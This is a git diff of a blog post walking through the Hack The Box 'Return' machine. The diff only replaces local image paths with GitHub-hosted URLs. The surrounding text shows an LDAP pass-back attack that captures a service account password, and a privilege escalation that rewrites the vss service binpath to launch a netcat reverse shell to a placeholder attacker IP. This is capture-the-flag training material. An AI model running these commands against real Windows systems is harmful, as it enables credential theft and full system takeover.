@@ -7,14 +7,14 @@ tags:
   - writeup
 description: "Room link: https://app.hackthebox.com/machines/Return"
 canonical_url: "https://medium.com/@hemanthakrishnach/return-hack-the-box-full-walkthrough-faeb59da8833"
-image: "/assets/images/posts/return-hack-the-box-full-walkthrough/img-000-85946292.png"
+image: "https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/return-hack-the-box-full-walkthrough/img-000-85946292.png"
 ---
 
 Room link: https://app.hackthebox.com/machines/Return
 
 ---
 
-Room link: <https://app.hackthebox.com/machines/Return>![image](/assets/images/posts/return-hack-the-box-full-walkthrough/img-000-85946292.png)
+Room link: <https://app.hackthebox.com/machines/Return>![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/return-hack-the-box-full-walkthrough/img-000-85946292.png)
 
 ### Introduction
 
@@ -26,7 +26,7 @@ We begin with an Nmap scan to identify open ports and services:
 ```xml
 nmap -sC -sV <MACHINE_IP>
 ```
-![image](/assets/images/posts/return-hack-the-box-full-walkthrough/img-001-b678290e.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/return-hack-the-box-full-walkthrough/img-001-b678290e.png)
 
 #### The scan reveals several interesting services:
 
@@ -40,13 +40,13 @@ This strongly suggests:
 
 ### 🌐 Web Enumeration
 
-Navigating to the web interface at `http://`<MACHINE\_IP>`/index.php` brings up a printer management console.![image](/assets/images/posts/return-hack-the-box-full-walkthrough/img-002-bfb09fa8.png)
+Navigating to the web interface at `http://`<MACHINE\_IP>`/index.php` brings up a printer management console.![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/return-hack-the-box-full-walkthrough/img-002-bfb09fa8.png)
 
 Under the **Settings** tab, we find a configuration for an LDAP server.
 
 - Server Address: `printer.return.local`- Port: `389` (LDAP)- Username: `svc-printer`
 
-![image](/assets/images/posts/return-hack-the-box-full-walkthrough/img-003-27e26f3a.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/return-hack-the-box-full-walkthrough/img-003-27e26f3a.png)
 
 This hints that:
 
@@ -61,7 +61,7 @@ Since the password field is obscured, we can perform an **LDAP Pass-back attack*
 The listener captures the connection and the credentials:
 > ***svc-printer : 1edFg43012!!***
 
-![image](/assets/images/posts/return-hack-the-box-full-walkthrough/img-004-e66346b4.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/return-hack-the-box-full-walkthrough/img-004-e66346b4.png)
 
 ### 💻 Initial Access
 
@@ -74,7 +74,7 @@ Upon successful login, we land in `C:\Users\svc-printer\Documents`. Navigating t
 ```bash
 type C:\Users\svc-printer\Desktop\user.txt
 ```
-![image](/assets/images/posts/return-hack-the-box-full-walkthrough/img-005-015d292b.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/return-hack-the-box-full-walkthrough/img-005-015d292b.png)
 
 ### ⬆️ Privilege Escalation
 
@@ -83,17 +83,17 @@ To escalate privileges, we first examine the groups associated with the `svc-pri
 net user svc-printer
 ```
 
-The output shows that the user is a member of the **Server Operators** group. This is a highly privileged group that allows users to start, stop, and configure services.![image](/assets/images/posts/return-hack-the-box-full-walkthrough/img-006-bc5f0800.png)
+The output shows that the user is a member of the **Server Operators** group. This is a highly privileged group that allows users to start, stop, and configure services.![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/return-hack-the-box-full-walkthrough/img-006-bc5f0800.png)
 
 We can exploit this by reconfiguring a service to execute a malicious payload. We’ll use the **Volume Shadow Copy (vss)** service.
 
 - **Upload Netcat:** Upload a Windows version of `nc.exe` to the target. Download a copy from [here](https://github.com/int0x33/nc.exe/).
 
-![image](/assets/images/posts/return-hack-the-box-full-walkthrough/img-007-a3ba619a.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/return-hack-the-box-full-walkthrough/img-007-a3ba619a.png)
 
 - **Reconfigure the Service:** Change the binary path of the `vss` service to execute a reverse shell back to our machine: `sc.exe config vss binpath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe <ATTACKER_IP> 4444"`
 
-![image](/assets/images/posts/return-hack-the-box-full-walkthrough/img-008-97d9734f.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/return-hack-the-box-full-walkthrough/img-008-97d9734f.png)
 
 - **Stop and restart the Service:**
 
@@ -104,9 +104,9 @@ sc.exe stop vss
 ```sql
 sc.exe start vss
 ```
-![image](/assets/images/posts/return-hack-the-box-full-walkthrough/img-009-fb766b5b.png)
+![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/return-hack-the-box-full-walkthrough/img-009-fb766b5b.png)
 
-On our attacker machine, we catch the shell on port 4444. Running `whoami` confirms we are now **nt authority\system**.![image](/assets/images/posts/return-hack-the-box-full-walkthrough/img-010-d58ee3bd.png)
+On our attacker machine, we catch the shell on port 4444. Running `whoami` confirms we are now **nt authority\system**.![image](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/return-hack-the-box-full-walkthrough/img-010-d58ee3bd.png)
 
 Now with SYSTEM privileges, we can navigate to the Administrator’s desktop to collect the final flag.
 ```bash
